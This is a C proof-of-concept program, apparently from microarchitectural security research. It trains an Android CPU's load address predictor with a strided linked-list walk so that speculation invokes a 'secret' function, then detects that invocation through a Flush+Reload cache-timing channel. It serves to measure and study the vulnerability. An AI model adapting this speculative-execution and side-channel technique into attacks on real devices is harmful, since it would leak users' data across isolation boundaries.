#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include "pmu_android.h"

// Channel_ptr and PAGE_SZ constants must be global
// for the secret function to have them in scope.
unsigned char *channel_ptr;
const int PAGE_SZ = 4096;

// Does absolutely nothing.
__attribute__((noinline)) void dummy_function()
{
    return;
}

// Has the same signature as the dummy function
// such that function pointer can be the same type,
// but touches the cache channel array. After that,
// tries to read from address 0. This is a sanity check,
// because any architectural branch to this function
// will make the program segfault.
__attribute__((noinline)) void secret_function()
{
    *(volatile char *)(channel_ptr + 0x77 * PAGE_SZ);
    *(volatile char *)0;
    return;
}

int getRandomNumber(int min, int max)
{
    return min + rand() % (max - min + 1);
}

// Define the structure for a linked list node, but this time
// data is a double pointer to function that takes no args and
// returns void, so either dummy_function or secret_function.
struct Node
{
    void (**data)();
    struct Node *next;
};

// Each node takes 64 bytes (=L2 cacheline size) or 256 bytes
// such that 1) they can be flushed independently and 2)
// the node addresses do not stride - only the pointers to data.
struct Node *createNode(void (**data)())
{
    const int L2_LINE_SZ = 64;
    struct Node *newNode = (struct Node *)malloc(L2_LINE_SZ * getRandomNumber(1, 2));
    if (newNode == NULL)
    {
        printf("Memory allocation for Node struct failed\n");
        exit(EXIT_FAILURE);
    }
    newNode->data = data;
    newNode->next = NULL;
    return newNode;
}

// insertAtEnd returns a pointer to the newly
// created node, such that we can flush the last node
// when measuring for speculation.
struct Node *insertAtEnd(struct Node **head, void (**data)())
{
    struct Node *newNode = createNode(data);
    if (*head == NULL)
    {
        *head = newNode;
    }
    else
    {
        struct Node *current = *head;
        while (current->next != NULL)
        {
            current = current->next;
        }
        current->next = newNode;
    }
    return newNode;
}

void freeList(struct Node *head)
{
    while (head != NULL)
    {
        struct Node *temp = head;
        head = head->next;
        free(temp);
    }
}

// Invocation is commented out, but this is for debugging purposes.
void printList(struct Node *head)
{
    printf("Head Node\n");
    while (head != NULL)
    {
        printf("(Addr: %p, Data: %p) ->\n", head, head->data);
        head = head->next;
    }
    printf("Tail Node\n");
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s CORE\n", argv[0]);
        return EXIT_FAILURE;
    }

    srand((unsigned int)time(NULL));
    const int core_id = atoi(argv[1]);

    // Constants for memory allocations. Linked list length
    // and stride are fixed to optimal parameters of
    // 1000 training loads, 32 bytes apart.
    const int LL_SIZE = 1000;
    const int STRIDE = 32;
    const int L2_LINE_SZ = 64;

    // How many cycles (incl. barrier instructions)
    // should we count as a cache hit?
    const int CACHE_HIT_THRESHOLD = 150;

    // This is for sizing the buffer where the striding
    // memory accesses load from.
    const int NUM_PAGES_BUF = 1 + (LL_SIZE * STRIDE) / PAGE_SZ;

    // How many linked list traversals should be performed
    // between each Flush+Reload measurement?
    const int TRIALS = 20;

    // When measuring activation rate, how many runs
    // should be performed?
    const int MEASUREMENTS = 1000;

    pin_to_core_android(core_id);
    try_enable_pmu_for_this_process();

    // Allocate buffer pages.
    void *buffer = mmap(NULL, NUM_PAGES_BUF * PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (buffer == MAP_FAILED)
    {
        printf("Failed to allocate buffer pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(buffer, 0x41, NUM_PAGES_BUF * PAGE_SZ);
    }

    // Allocate the reload buffer for Flush+Reload.
    void *channel_pages = mmap(NULL, 256 * PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (channel_pages == MAP_FAILED)
    {
        printf("Failed to allocate cache channel pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(channel_pages, 0x99, 256 * PAGE_SZ);
        channel_ptr = (unsigned char *)channel_pages;
    }

    // Initialize the linked list, but keep a pointer to the last node,
    // since we will flush it to force speculation.
    struct Node *ll = NULL;
    struct Node *lastNode = NULL;

    for (int i = 0; i < LL_SIZE; ++i)
    {
        void (*temp)() = (void (*)())buffer + i * STRIDE;
        void (**ptr)() = (void (**)())temp;

        if (i == LL_SIZE - 1)
        {
            // First, write secret function pointer to predicted
            // striding load address.
            *ptr = secret_function;

            // Then, decrement the pointer, making
            // the new pointer disobey the stride and
            // point to a dummy function instead.
            ptr = (void (**)())(temp - 5 * STRIDE);
            lastNode = insertAtEnd(&ll, ptr);
        }
        else
        {
            // All architectural accesses from the linked list traversal should
            // lead to the dummy function being invoked.
            *ptr = dummy_function;
            insertAtEnd(&ll, ptr);
        }
    }

    // Uncomment for debugging!
    // printList(ll);

    // We'll traverse the linked list, and see how many times
    // we receive 0x77 (which is NOT supposed to be sent!)
    int successes = 0;
    const int SECRET_IDX = 0x77;

    for (int i = 0; i < MEASUREMENTS; ++i)
    {
        // Flush only the probe index we care about.
        serialized_flush((void *)(channel_ptr + SECRET_IDX * PAGE_SZ));

        // Traverse the linked list, chasing the pointers.
        for (int i = 0; i < TRIALS; ++i)
        {
            // Flush the last node to force LAP to speculate.
            serialized_flush((void *)lastNode);

            struct Node *head = ll;
            while (head != NULL)
            {
                register void (**int_ptr)() = (void (**)())(head->data);
                register void (*lap_load)() = *int_ptr;
                lap_load();
                head = head->next;
            }
        }

        // Measure Flush+Reload for the probe index.
        uint64_t start = rdtsc();
        volatile unsigned char trash_secret = channel_ptr[SECRET_IDX * PAGE_SZ];
        uint64_t end = rdtsc();
        uint64_t timing_secret = end - start;

        if (timing_secret < CACHE_HIT_THRESHOLD)
        {
            ++successes;
        }

        // Uncomment to read all measurements.
        // for (int j = 0; j < 256; ++j)
        // {
        //     if (timings[j] < CACHE_HIT_THRESHOLD)
        //     {
        //         printf("0x%02x: %llu\n", j, timings[j]);
        //     }
        // }
    }

    printf("%d/%d secret function invoked\n\n", successes, MEASUREMENTS);

    // Clean up allocations and linked list.
    if (munmap(buffer, NUM_PAGES_BUF * PAGE_SZ) == -1)
    {
        printf("Failed to deallocate buffer pages\n");
        return EXIT_FAILURE;
    }
    if (munmap(channel_pages, 256 * PAGE_SZ) == -1)
    {
        printf("Failed to deallocate cache channel pages\n");
        return EXIT_FAILURE;
    }
    freeList(ll);

    return EXIT_SUCCESS;
}
